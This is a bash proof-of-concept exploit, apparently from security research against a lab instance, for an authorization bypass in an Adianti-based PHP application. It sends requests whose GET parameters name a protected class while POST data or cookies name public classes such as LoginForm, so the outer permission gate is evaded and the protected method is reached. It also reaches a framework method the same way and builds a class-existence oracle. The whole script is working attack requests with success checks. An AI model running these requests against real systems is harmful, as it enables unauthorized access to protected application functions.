#!/usr/bin/env bash
set -euo pipefail

B="${B:-http://127.0.0.1:18080}"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

python3 "$ROOT/tools/loopback_guard.py" "$B"

direct="$(curl -sS \
  "$B/engine.php?class=SystemModulesCheckView&method=onShow&static=1")"

[[ "$direct" == *'Permissão negada'* ]] || {
  echo 'FAIL_direct_protected_control' >&2
  exit 1
}

# PHP builds $_REQUEST after $_GET and then $_POST in this runtime. The outer
# application gate therefore sees the POST class/method, while inherited
# TPage::run() reads the still distinct GET class/method and redispatches them.
for public_class in LoginForm SystemPasswordResetForm; do
  bypassed="$(curl -sS \
    "$B/engine.php?class=SystemModulesCheckView&method=onShow&static=1" \
    --data "class=$public_class&method=run&static=1")"

  [[ "$bypassed" == *'LAB_PROTECTED_METHOD_REACHED'* ]] || {
    echo "FAIL_mixed_source_dispatch_did_not_reach_canary:$public_class" >&2
    exit 1
  }

  [[ "$bypassed" != *'Permissão negada'* ]] || {
    echo "FAIL_mixed_source_dispatch_still_denied:$public_class" >&2
    exit 1
  }

  echo "PASS_mixed_get_post_authorization_bypass:$public_class"

  # The non-static branch needs only the class collision. Core constructs the
  # public page and TPage::show() calls the inherited GET-based run() method.
  wrapped_bypassed="$(curl -sS \
    "$B/engine.php?class=SystemModulesCheckView&method=onShow" \
    --data "class=$public_class")"

  [[ "$wrapped_bypassed" == *'LAB_PROTECTED_METHOD_REACHED'* ]] || {
    echo "FAIL_mixed_source_wrapped_dispatch:$public_class" >&2
    exit 1
  }
  echo "PASS_mixed_get_post_wrapped_authorization_bypass:$public_class"

  cookie_bypassed="$(curl -sS \
    "$B/engine.php?class=SystemModulesCheckView&method=onShow&static=1" \
    -H "Cookie: class=$public_class; method=run; static=1")"

  [[ "$cookie_bypassed" == *'LAB_PROTECTED_METHOD_REACHED'* ]] || {
    echo "FAIL_mixed_cookie_get_dispatch_did_not_reach_canary:$public_class" >&2
    exit 1
  }

  [[ "$cookie_bypassed" != *'Permissão negada'* ]] || {
    echo "FAIL_mixed_cookie_get_dispatch_still_denied:$public_class" >&2
    exit 1
  }

  echo "PASS_mixed_cookie_get_authorization_bypass:$public_class"
done

# This second oracle uses only a framework class and a side-effect-free reload
# helper. It demonstrates that the inner dispatch is not limited to the lab
# canary class.
core_query='class=Adianti%5CCore%5CAdiantiCoreApplication&method=reload'
direct_core="$(curl -sS "$B/engine.php?$core_query")"
[[ "$direct_core" == *'Permissão negada'* ]] || {
  echo 'FAIL_direct_core_control' >&2
  exit 1
}

core_bypassed="$(curl -sS "$B/engine.php?$core_query" \
  --data 'class=SystemPasswordResetForm&method=run&static=1')"
[[ "$core_bypassed" == *"__adianti_goto_page('index.php')"* ]] || {
  echo 'FAIL_framework_reload_not_reached' >&2
  exit 1
}
echo 'PASS_mixed_get_post_framework_method_bypass'

# Once the mixed dispatch is available, a deliberately missing inner method is
# also a no-state class-presence oracle: an existing class is constructed and
# produces no body, while an absent class throws at TPage.php:93.
present_probe="$(curl -sS \
  "$B/engine.php?class=SystemModulesCheckView&method=__raptor_presence_probe&static=1" \
  --data 'class=SystemPasswordResetForm&method=run&static=1')"
[[ -z "$present_probe" ]] || {
  echo 'FAIL_existing_inner_class_presence_control' >&2
  exit 1
}

absent_probe="$(curl -sS \
  "$B/engine.php?class=NoSuchInnerClassRaptor&method=__raptor_presence_probe&static=1" \
  --data 'class=SystemPasswordResetForm&method=run&static=1')"
[[ "$absent_probe" == *"Class 'NoSuchInnerClassRaptor' not found"* ]] || {
  echo 'FAIL_absent_inner_class_presence_control' >&2
  exit 1
}
echo 'PASS_mixed_dispatch_class_presence_oracle'
